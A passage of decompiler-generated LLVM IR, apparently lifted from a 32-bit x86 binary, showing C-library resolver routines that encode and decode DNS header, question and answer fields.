  %v3_8056ee6 = add i32 %v2_8056ee6, 3
  %v4_8056ee6 = inttoptr i32 %v3_8056ee6 to i8*
  store i8 %v2_8056ee4, i8* %v4_8056ee6, align 1
  %v0_8056ee9 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8056ee9 = add i32 %v0_8056ee9, 33
  %v2_8056ee9 = inttoptr i32 %v1_8056ee9 to i8*
  %v3_8056ee9 = load i8, i8* %v2_8056ee9, align 1
  %v2_8056eed = load i32, i32* %esi.global-to-local, align 4
  %v3_8056eed = add i32 %v2_8056eed, 4
  %v4_8056eed = inttoptr i32 %v3_8056eed to i8*
  store i8 %v3_8056ee9, i8* %v4_8056eed, align 1
  %v0_8056ef0 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8056ef0 = add i32 %v0_8056ef0, 32
  %v2_8056ef0 = inttoptr i32 %v1_8056ef0 to i32*
  %v3_8056ef0 = load i32, i32* %v2_8056ef0, align 4
  %v1_8056ef3 = trunc i32 %v3_8056ef0 to i8
  %v2_8056ef3 = load i32, i32* %esi.global-to-local, align 4
  %v3_8056ef3 = add i32 %v2_8056ef3, 5
  %v4_8056ef3 = inttoptr i32 %v3_8056ef3 to i8*
  store i8 %v1_8056ef3, i8* %v4_8056ef3, align 1
  %v0_8056ef6 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8056ef6 = add i32 %v0_8056ef6, 37
  %v2_8056ef6 = inttoptr i32 %v1_8056ef6 to i8*
  %v3_8056ef6 = load i8, i8* %v2_8056ef6, align 1
  %v2_8056efa = load i32, i32* %esi.global-to-local, align 4
  %v3_8056efa = add i32 %v2_8056efa, 6
  %v4_8056efa = inttoptr i32 %v3_8056efa to i8*
  store i8 %v3_8056ef6, i8* %v4_8056efa, align 1
  %v0_8056efd = load i32, i32* %ebx.global-to-local, align 4
  %v1_8056efd = add i32 %v0_8056efd, 36
  %v2_8056efd = inttoptr i32 %v1_8056efd to i32*
  %v3_8056efd = load i32, i32* %v2_8056efd, align 4
  %v1_8056f00 = trunc i32 %v3_8056efd to i8
  %v2_8056f00 = load i32, i32* %esi.global-to-local, align 4
  %v3_8056f00 = add i32 %v2_8056f00, 7
  %v4_8056f00 = inttoptr i32 %v3_8056f00 to i8*
  store i8 %v1_8056f00, i8* %v4_8056f00, align 1
  %v0_8056f03 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8056f03 = add i32 %v0_8056f03, 41
  %v2_8056f03 = inttoptr i32 %v1_8056f03 to i8*
  %v3_8056f03 = load i8, i8* %v2_8056f03, align 1
  %v2_8056f07 = load i32, i32* %esi.global-to-local, align 4
  %v3_8056f07 = add i32 %v2_8056f07, 8
  %v4_8056f07 = inttoptr i32 %v3_8056f07 to i8*
  store i8 %v3_8056f03, i8* %v4_8056f07, align 1
  %v0_8056f0a = load i32, i32* %ebx.global-to-local, align 4
  %v1_8056f0a = add i32 %v0_8056f0a, 40
  %v2_8056f0a = inttoptr i32 %v1_8056f0a to i32*
  %v3_8056f0a = load i32, i32* %v2_8056f0a, align 4
  %v1_8056f0d = trunc i32 %v3_8056f0a to i8
  %v2_8056f0d = load i32, i32* %esi.global-to-local, align 4
  %v3_8056f0d = add i32 %v2_8056f0d, 9
  %v4_8056f0d = inttoptr i32 %v3_8056f0d to i8*
  store i8 %v1_8056f0d, i8* %v4_8056f0d, align 1
  %v0_8056f10 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8056f10 = add i32 %v0_8056f10, 45
  %v2_8056f10 = inttoptr i32 %v1_8056f10 to i8*
  %v3_8056f10 = load i8, i8* %v2_8056f10, align 1
  %v2_8056f14 = load i32, i32* %esi.global-to-local, align 4
  %v3_8056f14 = add i32 %v2_8056f14, 10
  %v4_8056f14 = inttoptr i32 %v3_8056f14 to i8*
  store i8 %v3_8056f10, i8* %v4_8056f14, align 1
  %v0_8056f17 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8056f17 = add i32 %v0_8056f17, 44
  %v2_8056f17 = inttoptr i32 %v1_8056f17 to i32*
  %v3_8056f17 = load i32, i32* %v2_8056f17, align 4
  %v1_8056f1a = trunc i32 %v3_8056f17 to i8
  %v2_8056f1a = load i32, i32* %esi.global-to-local, align 4
  %v3_8056f1a = add i32 %v2_8056f1a, 11
  %v4_8056f1a = inttoptr i32 %v3_8056f1a to i8*
  store i8 %v1_8056f1a, i8* %v4_8056f1a, align 1
  %v2_8056f22.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_8056f22

dec_label_pc_8056f22:                             ; preds = %entry, %dec_label_pc_8056e8c
  %v2_8056f22 = phi i32 [ %v0_8056e75, %entry ], [ %v2_8056f22.pre, %dec_label_pc_8056e8c ]
  %v0_8056f24 = phi i32 [ -1, %entry ], [ 12, %dec_label_pc_8056e8c ]
  store i32 %v2_8056f22, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8056f24

; uselistorder directives
  uselistorder i32 45, { 6, 2, 5, 4, 1, 0, 3 }
  uselistorder i32 41, { 2, 1, 0 }
  uselistorder i32 37, { 4, 2, 0, 3, 1 }
  uselistorder i32 33, { 5, 3, 4, 1, 2, 0 }
  uselistorder label %dec_label_pc_8056f22, { 1, 0 }
}

define i32 @__decode_header() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i8* @__decompiler_undefined_function_2()
  %stack_var_-4 = alloca i32, align 4
  %v0_8056f28 = load i32, i32* @ebx, align 4
  store i32 %v0_8056f28, i32* %stack_var_-4, align 4
  %v4_8056f29 = ptrtoint i8* %tmp2 to i32
  store i32 %v4_8056f29, i32* @ecx, align 4
  store i32 %tmp, i32* %ebx.global-to-local, align 4
  %v2_8056f31 = load i8, i8* %tmp2, align 1
  %v3_8056f31 = zext i8 %v2_8056f31 to i32
  %v1_8056f34 = add i32 %v4_8056f29, 1
  %v2_8056f34 = inttoptr i32 %v1_8056f34 to i8*
  %v3_8056f34 = load i8, i8* %v2_8056f34, align 1
  %v4_8056f34 = zext i8 %v3_8056f34 to i32
  %v2_8056f38 = mul nuw nsw i32 %v3_8056f31, 256
  %v2_8056f3b = or i32 %v4_8056f34, %v2_8056f38
  %v2_8056f3d = inttoptr i32 %tmp to i32*
  store i32 %v2_8056f3b, i32* %v2_8056f3d, align 4
  %v0_8056f3f = load i32, i32* @ecx, align 4
  %v1_8056f3f = add i32 %v0_8056f3f, 2
  %v2_8056f3f = inttoptr i32 %v1_8056f3f to i8*
  %v3_8056f3f = load i8, i8* %v2_8056f3f, align 1
  %tmp6 = icmp slt i8 %v3_8056f3f, 0
  %v2_8056f43 = zext i1 %tmp6 to i32
  %v1_8056f46 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8056f46 = add i32 %v1_8056f46, 4
  %v3_8056f46 = inttoptr i32 %v2_8056f46 to i32*
  store i32 %v2_8056f43, i32* %v3_8056f46, align 4
  %v0_8056f49 = load i32, i32* @ecx, align 4
  %v1_8056f49 = add i32 %v0_8056f49, 2
  %v2_8056f49 = inttoptr i32 %v1_8056f49 to i8*
  %v3_8056f49 = load i8, i8* %v2_8056f49, align 1
  %v3_8056f4c = udiv i8 %v3_8056f49, 8
  %tmp7 = urem i8 %v3_8056f4c, 16
  %v1_8056f4f = zext i8 %tmp7 to i32
  %v1_8056f52 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8056f52 = add i32 %v1_8056f52, 8
  %v3_8056f52 = inttoptr i32 %v2_8056f52 to i32*
  store i32 %v1_8056f4f, i32* %v3_8056f52, align 4
  %v0_8056f55 = load i32, i32* @ecx, align 4
  %v1_8056f55 = add i32 %v0_8056f55, 2
  %v2_8056f55 = inttoptr i32 %v1_8056f55 to i8*
  %v3_8056f55 = load i8, i8* %v2_8056f55, align 1
  %div = udiv i8 %v3_8056f55, 4
  %tmp8 = urem i8 %div, 2
  %v1_8056f5c = zext i8 %tmp8 to i32
  %v1_8056f5f = load i32, i32* %ebx.global-to-local, align 4
  %v2_8056f5f = add i32 %v1_8056f5f, 12
  %v3_8056f5f = inttoptr i32 %v2_8056f5f to i32*
  store i32 %v1_8056f5c, i32* %v3_8056f5f, align 4
  %v0_8056f62 = load i32, i32* @ecx, align 4
  %v1_8056f62 = add i32 %v0_8056f62, 2
  %v2_8056f62 = inttoptr i32 %v1_8056f62 to i8*
  %v3_8056f62 = load i8, i8* %v2_8056f62, align 1
  %div5 = udiv i8 %v3_8056f62, 2
  %tmp9 = urem i8 %div5, 2
  %v1_8056f68 = zext i8 %tmp9 to i32
  %v1_8056f6b = load i32, i32* %ebx.global-to-local, align 4
  %v2_8056f6b = add i32 %v1_8056f6b, 16
  %v3_8056f6b = inttoptr i32 %v2_8056f6b to i32*
  store i32 %v1_8056f68, i32* %v3_8056f6b, align 4
  %v0_8056f6e = load i32, i32* @ecx, align 4
  %v1_8056f6e = add i32 %v0_8056f6e, 2
  %v2_8056f6e = inttoptr i32 %v1_8056f6e to i8*
  %v3_8056f6e = load i8, i8* %v2_8056f6e, align 1
  %tmp10 = urem i8 %v3_8056f6e, 2
  %v1_8056f72 = zext i8 %tmp10 to i32
  %v1_8056f75 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8056f75 = add i32 %v1_8056f75, 20
  %v3_8056f75 = inttoptr i32 %v2_8056f75 to i32*
  store i32 %v1_8056f72, i32* %v3_8056f75, align 4
  %v0_8056f78 = load i32, i32* @ecx, align 4
  %v1_8056f78 = add i32 %v0_8056f78, 3
  %v2_8056f78 = inttoptr i32 %v1_8056f78 to i8*
  %v3_8056f78 = load i8, i8* %v2_8056f78, align 1
  %tmp11 = icmp slt i8 %v3_8056f78, 0
  %v2_8056f7c = zext i1 %tmp11 to i32
  %v1_8056f7f = load i32, i32* %ebx.global-to-local, align 4
  %v2_8056f7f = add i32 %v1_8056f7f, 24
  %v3_8056f7f = inttoptr i32 %v2_8056f7f to i32*
  store i32 %v2_8056f7c, i32* %v3_8056f7f, align 4
  %v0_8056f82 = load i32, i32* @ecx, align 4
  %v1_8056f82 = add i32 %v0_8056f82, 3
  %v2_8056f82 = inttoptr i32 %v1_8056f82 to i8*
  %v3_8056f82 = load i8, i8* %v2_8056f82, align 1
  %tmp12 = urem i8 %v3_8056f82, 16
  %v1_8056f86 = zext i8 %tmp12 to i32
  %v1_8056f89 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8056f89 = add i32 %v1_8056f89, 28
  %v3_8056f89 = inttoptr i32 %v2_8056f89 to i32*
  store i32 %v1_8056f86, i32* %v3_8056f89, align 4
  %v0_8056f8c = load i32, i32* @ecx, align 4
  %v1_8056f8c = add i32 %v0_8056f8c, 4
  %v2_8056f8c = inttoptr i32 %v1_8056f8c to i8*
  %v3_8056f8c = load i8, i8* %v2_8056f8c, align 1
  %v4_8056f8c = zext i8 %v3_8056f8c to i32
  %v1_8056f90 = add i32 %v0_8056f8c, 5
  %v2_8056f90 = inttoptr i32 %v1_8056f90 to i8*
  %v3_8056f90 = load i8, i8* %v2_8056f90, align 1
  %v4_8056f90 = zext i8 %v3_8056f90 to i32
  %v2_8056f94 = mul nuw nsw i32 %v4_8056f8c, 256
  %v2_8056f97 = or i32 %v4_8056f90, %v2_8056f94
  %v1_8056f99 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8056f99 = add i32 %v1_8056f99, 32
  %v3_8056f99 = inttoptr i32 %v2_8056f99 to i32*
  store i32 %v2_8056f97, i32* %v3_8056f99, align 4
  %v0_8056f9c = load i32, i32* @ecx, align 4
  %v1_8056f9c = add i32 %v0_8056f9c, 6
  %v2_8056f9c = inttoptr i32 %v1_8056f9c to i8*
  %v3_8056f9c = load i8, i8* %v2_8056f9c, align 1
  %v4_8056f9c = zext i8 %v3_8056f9c to i32
  %v1_8056fa0 = add i32 %v0_8056f9c, 7
  %v2_8056fa0 = inttoptr i32 %v1_8056fa0 to i8*
  %v3_8056fa0 = load i8, i8* %v2_8056fa0, align 1
  %v4_8056fa0 = zext i8 %v3_8056fa0 to i32
  %v2_8056fa4 = mul nuw nsw i32 %v4_8056f9c, 256
  %v2_8056fa7 = or i32 %v4_8056fa0, %v2_8056fa4
  %v1_8056fa9 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8056fa9 = add i32 %v1_8056fa9, 36
  %v3_8056fa9 = inttoptr i32 %v2_8056fa9 to i32*
  store i32 %v2_8056fa7, i32* %v3_8056fa9, align 4
  %v0_8056fac = load i32, i32* @ecx, align 4
  %v1_8056fac = add i32 %v0_8056fac, 8
  %v2_8056fac = inttoptr i32 %v1_8056fac to i8*
  %v3_8056fac = load i8, i8* %v2_8056fac, align 1
  %v4_8056fac = zext i8 %v3_8056fac to i32
  %v1_8056fb0 = add i32 %v0_8056fac, 9
  %v2_8056fb0 = inttoptr i32 %v1_8056fb0 to i8*
  %v3_8056fb0 = load i8, i8* %v2_8056fb0, align 1
  %v4_8056fb0 = zext i8 %v3_8056fb0 to i32
  %v2_8056fb4 = mul nuw nsw i32 %v4_8056fac, 256
  %v2_8056fb7 = or i32 %v4_8056fb0, %v2_8056fb4
  %v1_8056fb9 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8056fb9 = add i32 %v1_8056fb9, 40
  %v3_8056fb9 = inttoptr i32 %v2_8056fb9 to i32*
  store i32 %v2_8056fb7, i32* %v3_8056fb9, align 4
  %v0_8056fbc = load i32, i32* @ecx, align 4
  %v1_8056fbc = add i32 %v0_8056fbc, 10
  %v2_8056fbc = inttoptr i32 %v1_8056fbc to i8*
  %v3_8056fbc = load i8, i8* %v2_8056fbc, align 1
  %v4_8056fbc = zext i8 %v3_8056fbc to i32
  %v1_8056fc0 = add i32 %v0_8056fbc, 11
  %v2_8056fc0 = inttoptr i32 %v1_8056fc0 to i8*
  %v3_8056fc0 = load i8, i8* %v2_8056fc0, align 1
  %v4_8056fc0 = zext i8 %v3_8056fc0 to i32
  %v2_8056fc4 = mul nuw nsw i32 %v4_8056fbc, 256
  %v2_8056fc7 = or i32 %v4_8056fc0, %v2_8056fc4
  %v1_8056fc9 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8056fc9 = add i32 %v1_8056fc9, 44
  %v3_8056fc9 = inttoptr i32 %v2_8056fc9 to i32*
  store i32 %v2_8056fc7, i32* %v3_8056fc9, align 4
  %v2_8056fd1 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8056fd1, i32* @ebx, align 4
  ret i32 12

; uselistorder directives
  uselistorder i8* %tmp2, { 1, 0 }
  uselistorder i32 11, { 11, 12, 4, 5, 7, 8, 13, 6, 2, 9, 10, 0, 1, 3 }
  uselistorder i32 40, { 9, 10, 3, 12, 13, 14, 11, 1, 2, 4, 5, 6, 7, 8, 0 }
  uselistorder i32 7, { 21, 22, 4, 9, 5, 0, 3, 10, 17, 18, 19, 20, 6, 1, 16, 7, 8, 11, 12, 13, 14, 15, 2 }
  uselistorder i32 6, { 26, 27, 2, 3, 21, 22, 0, 7, 19, 15, 16, 9, 29, 17, 23, 24, 4, 1, 5, 8, 13, 14, 18, 25, 10, 20, 11, 12, 28, 6 }
  uselistorder i32 28, { 35, 36, 18, 19, 37, 25, 49, 48, 41, 42, 2, 43, 44, 45, 46, 47, 4, 5, 6, 0, 26, 17, 20, 21, 38, 39, 27, 28, 29, 30, 31, 32, 1, 33, 50, 40, 22, 23, 24, 7, 8, 34, 13, 12, 10, 11, 14, 15, 9, 16, 3 }
  uselistorder i8 2, { 0, 1, 2, 3, 4, 16, 5, 13, 21, 17, 6, 18, 7, 8, 9, 10, 11, 19, 20, 12, 14, 15 }
  uselistorder i8 4, { 0, 3, 1, 4, 5, 2 }
  uselistorder i8 16, { 0, 1, 2, 4, 5, 6, 3 }
  uselistorder i8 8, { 0, 7, 2, 6, 3, 1, 4, 5 }
}

define i32 @__encode_question() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %v0_8056fd4 = load i32, i32* @edi, align 4
  %v0_8056fd5 = load i32, i32* @esi, align 4
  %v0_8056fd6 = load i32, i32* @ebx, align 4
  store i32 %v0_8056fd6, i32* %stack_var_-12, align 4
  store i32 %tmp3, i32* @esi, align 4
  store i32 %tmp2, i32* @edi, align 4
  store i32 %tmp, i32* @ebx, align 4
  %v0_8056fe3 = load i32, i32* @eax, align 4
  %v1_8056fe6 = inttoptr i32 %tmp3 to i32*
  %v2_8056fe6 = load i32, i32* %v1_8056fe6, align 4
  %v7_8056fe8 = inttoptr i32 %v2_8056fe6 to i8*
  %v8_8056fe8 = call i32 @__encode_dotted(i8* %v7_8056fe8, i32 %tmp2, i32 %tmp, i32 %v0_8056fe3, i32 %v0_8056fd6, i32 %v0_8056fd5, i32 %v0_8056fd4)
  store i32 %v8_8056fe8, i32* @ecx, align 4
  %v2_8056ff2 = icmp slt i32 %v8_8056fe8, 0
  br i1 %v2_8056ff2, label %dec_label_pc_8057021, label %dec_label_pc_8056ff6

dec_label_pc_8056ff6:                             ; preds = %entry
  %v0_8056ff6 = load i32, i32* @ebx, align 4
  %v2_8056ff6 = sub i32 %v0_8056ff6, %v8_8056fe8
  %v1_8056ff8 = add i32 %v2_8056ff6, -3
  %v6_8056ff8 = sub i32 2, %v2_8056ff6
  %v7_8056ff8 = and i32 %v6_8056ff8, %v2_8056ff6
  %v8_8056ff8 = icmp slt i32 %v7_8056ff8, 0
  %v9_8056ff8 = icmp eq i32 %v1_8056ff8, 0
  %v10_8056ff8 = icmp slt i32 %v1_8056ff8, 0
  %v3_8056ffb = icmp eq i1 %v10_8056ff8, %v8_8056ff8
  %v4_8056ffb = icmp eq i1 %v9_8056ff8, false
  %v5_8056ffb = and i1 %v4_8056ffb, %v3_8056ffb
  br i1 %v5_8056ffb, label %dec_label_pc_8057002, label %dec_label_pc_8056ffd

dec_label_pc_8056ffd:                             ; preds = %dec_label_pc_8056ff6
  store i32 -1, i32* @ecx, align 4
  br label %dec_label_pc_8057021

dec_label_pc_8057002:                             ; preds = %dec_label_pc_8056ff6
  %v0_8057002 = load i32, i32* @edi, align 4
  %v2_8057002 = add i32 %v0_8057002, %v8_8056fe8
  store i32 %v2_8057002, i32* @edx, align 4
  %v1_8057005 = add i32 %v8_8056fe8, 4
  store i32 %v1_8057005, i32* @ecx, align 4
  %v0_8057008 = load i32, i32* @esi, align 4
  %v1_8057008 = add i32 %v0_8057008, 5
  %v2_8057008 = inttoptr i32 %v1_8057008 to i8*
  %v3_8057008 = load i8, i8* %v2_8057008, align 1
  %v3_805700c = inttoptr i32 %v2_8057002 to i8*
  store i8 %v3_8057008, i8* %v3_805700c, align 1
  %v0_805700e = load i32, i32* @esi, align 4
  %v1_805700e = add i32 %v0_805700e, 4
  %v2_805700e = inttoptr i32 %v1_805700e to i32*
  %v3_805700e = load i32, i32* %v2_805700e, align 4
  %v1_8057011 = trunc i32 %v3_805700e to i8
  %v2_8057011 = load i32, i32* @edx, align 4
  %v3_8057011 = add i32 %v2_8057011, 1
  %v4_8057011 = inttoptr i32 %v3_8057011 to i8*
  store i8 %v1_8057011, i8* %v4_8057011, align 1
  %v0_8057014 = load i32, i32* @esi, align 4
  %v1_8057014 = add i32 %v0_8057014, 9
  %v2_8057014 = inttoptr i32 %v1_8057014 to i8*
  %v3_8057014 = load i8, i8* %v2_8057014, align 1
  %v2_8057018 = load i32, i32* @edx, align 4
  %v3_8057018 = add i32 %v2_8057018, 2
  %v4_8057018 = inttoptr i32 %v3_8057018 to i8*
  store i8 %v3_8057014, i8* %v4_8057018, align 1
  %v0_805701b = load i32, i32* @esi, align 4
  %v1_805701b = add i32 %v0_805701b, 8
  %v2_805701b = inttoptr i32 %v1_805701b to i32*
  %v3_805701b = load i32, i32* %v2_805701b, align 4
  %v1_805701e = trunc i32 %v3_805701b to i8
  %v2_805701e = load i32, i32* @edx, align 4
  %v3_805701e = add i32 %v2_805701e, 3
  %v4_805701e = inttoptr i32 %v3_805701e to i8*
  store i8 %v1_805701e, i8* %v4_805701e, align 1
  %v0_8057021.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8057021

dec_label_pc_8057021:                             ; preds = %entry, %dec_label_pc_8056ffd, %dec_label_pc_8057002
  %v0_8057021 = phi i32 [ %v8_8056fe8, %entry ], [ -1, %dec_label_pc_8056ffd ], [ %v0_8057021.pre, %dec_label_pc_8057002 ]
  %v2_8057023 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8057023, i32* @ebx, align 4
  store i32 %v0_8056fd4, i32* @edi, align 4
  ret i32 %v0_8057021

; uselistorder directives
  uselistorder i32 %v1_8056ff8, { 1, 0 }
  uselistorder i32 %v2_8056ff6, { 0, 2, 1 }
  uselistorder i32 %v8_8056fe8, { 1, 2, 0, 3, 5, 4 }
  uselistorder i32 -3, { 3, 2, 1, 6, 4, 0, 5 }
  uselistorder label %dec_label_pc_8057021, { 2, 1, 0 }
}

define i32 @__length_question() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %v2_8057033 = call i32 @__length_dotted(i32 %tmp, i32 %tmp2)
  %v2_805703b = icmp slt i32 %v2_8057033, 0
  br i1 %v2_805703b, label %dec_label_pc_8057042, label %dec_label_pc_805703f

dec_label_pc_805703f:                             ; preds = %entry
  %v1_805703f = add i32 %v2_8057033, 4
  br label %dec_label_pc_8057042

dec_label_pc_8057042:                             ; preds = %entry, %dec_label_pc_805703f
  %v0_8057045 = phi i32 [ %v2_8057033, %entry ], [ %v1_805703f, %dec_label_pc_805703f ]
  ret i32 %v0_8057045

; uselistorder directives
  uselistorder label %dec_label_pc_8057042, { 1, 0 }
}

define i32 @__decode_answer() local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8057048 = load i32, i32* @ebp, align 4
  %v0_8057049 = load i32, i32* @edi, align 4
  %v0_805704a = load i32, i32* @esi, align 4
  %v0_805704b = load i32, i32* @ebx, align 4
  store i32 %v0_805704b, i32* %stack_var_-16, align 4
  store i32 %tmp7, i32* @ebx, align 4
  %v2_805706c = ptrtoint i32* %stack_var_-272 to i32
  %v4_8057079 = call i32 @__decode_dotted(i32 %tmp4, i32 %tmp7, i32 %v2_805706c, i32 256)
  store i32 %v4_8057079, i32* @edi, align 4
  %v3_8057083 = icmp slt i32 %v4_8057079, 0
  br i1 %v3_8057083, label %dec_label_pc_8057134, label %dec_label_pc_805708b

dec_label_pc_805708b:                             ; preds = %entry
  %v0_805708b = load i32, i32* @ebx, align 4
  %v3_805708b = add i32 %v0_805708b, %v4_8057079
  %v0_805708d = load i32, i32* @esi, align 4
  %v2_805708d = sub i32 %v0_805708d, %v3_805708b
  %v1_8057093 = add i32 %v2_805708d, -10
  %v10_8057093 = icmp slt i32 %v1_8057093, 0
  store i32 %v1_8057093, i32* @esi, align 4
  %v1_805709a = icmp eq i1 %v10_8057093, false
  br i1 %v1_805709a, label %dec_label_pc_80570a3, label %dec_label_pc_805709c

dec_label_pc_805709c:                             ; preds = %dec_label_pc_805708b
  br label %dec_label_pc_8057134

dec_label_pc_80570a3:                             ; preds = %dec_label_pc_805708b
  %v6_80570aa = add i32 %v3_805708b, %tmp4
  store i32 %v6_80570aa, i32* @ebx, align 4
  %v1_80570b6 = bitcast i32* %stack_var_-272 to i8*
  %v2_80570b6 = call i32 @__GI_strdup(i8* %v1_80570b6)
  %v1_80570bb = load i32, i32* @ebp, align 4
  %v2_80570bb = inttoptr i32 %v1_80570bb to i32*
  store i32 %v2_80570b6, i32* %v2_80570bb, align 4
  %v0_80570be = load i32, i32* @ebx, align 4
  %v1_80570be = add i32 %v0_80570be, 4
  store i32 %v1_80570be, i32* %esi.global-to-local, align 4
  %v1_80570c1 = inttoptr i32 %v0_80570be to i8*
  %v2_80570c1 = load i8, i8* %v1_80570c1, align 1
  %v3_80570c1 = zext i8 %v2_80570c1 to i32
  %v1_80570c4 = add i32 %v0_80570be, 1
  %v2_80570c4 = inttoptr i32 %v1_80570c4 to i8*
  %v3_80570c4 = load i8, i8* %v2_80570c4, align 1
  %v4_80570c4 = zext i8 %v3_80570c4 to i32
  %v2_80570c8 = mul nuw nsw i32 %v3_80570c1, 256
  %v2_80570cb = or i32 %v4_80570c4, %v2_80570c8
  %v1_80570cd = load i32, i32* @ebp, align 4
  %v2_80570cd = add i32 %v1_80570cd, 4
  %v3_80570cd = inttoptr i32 %v2_80570cd to i32*
  store i32 %v2_80570cb, i32* %v3_80570cd, align 4
  %v0_80570d0 = load i32, i32* @ebx, align 4
  %v1_80570d0 = add i32 %v0_80570d0, 2
  %v2_80570d0 = inttoptr i32 %v1_80570d0 to i8*
  %v3_80570d0 = load i8, i8* %v2_80570d0, align 1
  %v4_80570d0 = zext i8 %v3_80570d0 to i32
  %v1_80570d4 = add i32 %v0_80570d0, 3
  %v2_80570d4 = inttoptr i32 %v1_80570d4 to i8*
  %v3_80570d4 = load i8, i8* %v2_80570d4, align 1
  %v4_80570d4 = zext i8 %v3_80570d4 to i32
  %v2_80570d8 = mul nuw nsw i32 %v4_80570d0, 256
  %v2_80570db = or i32 %v4_80570d4, %v2_80570d8
  %v1_80570dd = load i32, i32* @ebp, align 4
  %v2_80570dd = add i32 %v1_80570dd, 8
  %v3_80570dd = inttoptr i32 %v2_80570dd to i32*
  store i32 %v2_80570db, i32* %v3_80570dd, align 4
  %v0_80570e0 = load i32, i32* @ebx, align 4
  %v1_80570e0 = add i32 %v0_80570e0, 4
  %v2_80570e0 = inttoptr i32 %v1_80570e0 to i8*
  %v3_80570e0 = load i8, i8* %v2_80570e0, align 1
  %v4_80570e0 = zext i8 %v3_80570e0 to i32
  %v0_80570e4 = load i32, i32* %esi.global-to-local, align 4
  %v1_80570e4 = add i32 %v0_80570e4, 1
  %v2_80570e4 = inttoptr i32 %v1_80570e4 to i8*
  %v3_80570e4 = load i8, i8* %v2_80570e4, align 1
  %v4_80570e4 = zext i8 %v3_80570e4 to i32
  %v2_80570e8 = mul nuw i32 %v4_80570e0, 16777216
  %v2_80570eb = mul nuw nsw i32 %v4_80570e4, 65536
  %v1_80570ee = add i32 %v0_80570e4, 2
  %v2_80570ee = inttoptr i32 %v1_80570ee to i8*
  %v3_80570ee = load i8, i8* %v2_80570ee, align 1
  %v4_80570ee = zext i8 %v3_80570ee to i32
  %v2_80570f2 = mul nuw nsw i32 %v4_80570ee, 256
  %v2_80570f5 = or i32 %v2_80570eb, %v2_80570e8
  %v1_80570f7 = add i32 %v0_80570e4, 3
  %v2_80570f7 = inttoptr i32 %v1_80570f7 to i8*
  %v3_80570f7 = load i8, i8* %v2_80570f7, align 1
  %v4_80570f7 = zext i8 %v3_80570f7 to i32
  %v2_80570fb = or i32 %v4_80570f7, %v2_80570f5
  %v2_80570fd = or i32 %v2_80570fb, %v2_80570f2
  store i32 %v2_80570fd, i32* @ecx, align 4
  %v1_80570ff = load i32, i32* @ebp, align 4
  %v2_80570ff = add i32 %v1_80570ff, 12
  %v3_80570ff = inttoptr i32 %v2_80570ff to i32*
  store i32 %v2_80570fd, i32* %v3_80570ff, align 4
  %v0_8057102 = load i32, i32* @ebx, align 4
  %v1_8057102 = add i32 %v0_8057102, 8
  %v2_8057102 = inttoptr i32 %v1_8057102 to i8*
  %v3_8057102 = load i8, i8* %v2_8057102, align 1
  %v4_8057102 = zext i8 %v3_8057102 to i32
  %v1_8057106 = add i32 %v0_8057102, 9
  %v2_8057106 = inttoptr i32 %v1_8057106 to i8*
  %v3_8057106 = load i8, i8* %v2_8057106, align 1
  %v4_8057106 = zext i8 %v3_8057106 to i32
  %v2_805710a = mul nuw nsw i32 %v4_8057102, 256
  %v1_805710d = add i32 %v0_8057102, 10
  %v2_8057110 = or i32 %v4_8057106, %v2_805710a
  store i32 %v2_8057110, i32* @edx, align 4
  %v1_8057112 = load i32, i32* @ebp, align 4
  %v2_8057112 = add i32 %v1_8057112, 20
  %v3_8057112 = inttoptr i32 %v2_8057112 to i32*
  store i32 %v1_805710d, i32* %v3_8057112, align 4
  %v0_8057115 = load i32, i32* @edx, align 4
  %v1_8057115 = load i32, i32* @ebp, align 4
  %v2_8057115 = add i32 %v1_8057115, 16
  %v3_8057115 = inttoptr i32 %v2_8057115 to i32*
  store i32 %v0_8057115, i32* %v3_8057115, align 4
  %v1_805711f = add i32 %v3_805708b, 10
  %v1_8057122 = load i32, i32* @ebp, align 4
  %v2_8057122 = add i32 %v1_8057122, 24
  %v3_8057122 = inttoptr i32 %v2_8057122 to i32*
  store i32 %v1_805711f, i32* %v3_8057122, align 4
  %v4_8057125 = load i32, i32* @edx, align 4
  %v5_8057129 = icmp slt i32 %v1_8057093, %v4_8057125
  br i1 %v5_8057129, label %dec_label_pc_805712b, label %dec_label_pc_8057130

dec_label_pc_805712b:                             ; preds = %dec_label_pc_80570a3
  br label %dec_label_pc_8057134

dec_label_pc_8057130:                             ; preds = %dec_label_pc_80570a3
  %v1_8057130 = load i32, i32* @edi, align 4
  %v2_8057130 = add i32 %v4_8057125, 10
  %v3_8057130 = add i32 %v2_8057130, %v1_8057130
  br label %dec_label_pc_8057134

dec_label_pc_8057134:                             ; preds = %entry, %dec_label_pc_805712b, %dec_label_pc_805709c, %dec_label_pc_8057130
  %v0_805713a = phi i32 [ %v4_8057079, %entry ], [ -1, %dec_label_pc_805712b ], [ %v1_8057093, %dec_label_pc_805709c ], [ %v3_8057130, %dec_label_pc_8057130 ]
